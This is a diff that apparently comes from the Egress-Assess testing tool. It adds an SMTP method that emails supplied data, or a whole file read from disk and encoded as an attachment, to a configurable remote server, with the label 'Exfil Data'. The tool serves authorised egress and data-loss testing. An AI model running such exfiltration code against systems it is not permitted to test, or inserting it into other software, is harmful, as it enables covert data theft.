@@ -35,6 +35,42 @@ class Client:
             else:
                 self.file_transfer = cli_object.file
 
+    def negotiatedTransmit(self, data_to_transmit,config=None):
+
+
+        if config:
+            self.port = int(config["smtp"]["port"])
+
+        print "[+] Sending SMTP Data"
+
+        if not self.file_transfer:
+            # Create the message
+            msg = MIMEText('This is the data to exfil:\n\n' + data_to_transmit)
+            msg['To'] = email.utils.formataddr(('Server', 'server@egress-assess.com'))
+            msg['From'] = email.utils.formataddr(('Tester', 'tester@egress-assess.com'))
+            msg['Subject'] = 'Egress-Assess Exfil Data'
+        else:
+            msg = MIMEMultipart()
+            msg['Subject'] = 'Egress-Assess Exfil Data'
+            msg['From'] = email.utils.formataddr(('Tester', 'tester@egress-assess.com'))
+            msg['To'] = email.utils.formataddr(('Server', 'server@egress-assess.com'))
+
+            part = MIMEBase('application', "octet-stream")
+            part.set_payload(open(self.file_transfer, "rb").read())
+            Encoders.encode_base64(part)
+            part.add_header('Content-Disposition', 'attachment; filename=' + self.file_transfer)
+            msg.attach(part)
+
+        server = smtplib.SMTP(self.remote_server, self.port)
+        server.set_debuglevel(False)
+        try:
+            server.sendmail('tester@egress-assess.com', ['server@egress-assess.com'], msg.as_string())
+        finally:
+            server.quit()
+
+        print "[*] Data transmitted!"
+
+        return
     # transmit is the only required function within the object.  It is what
     # called by the framework to transmit data.  However, you can create as 
     # many "sub functions" for transmit to invoke as needed.  "data_to_transmit"
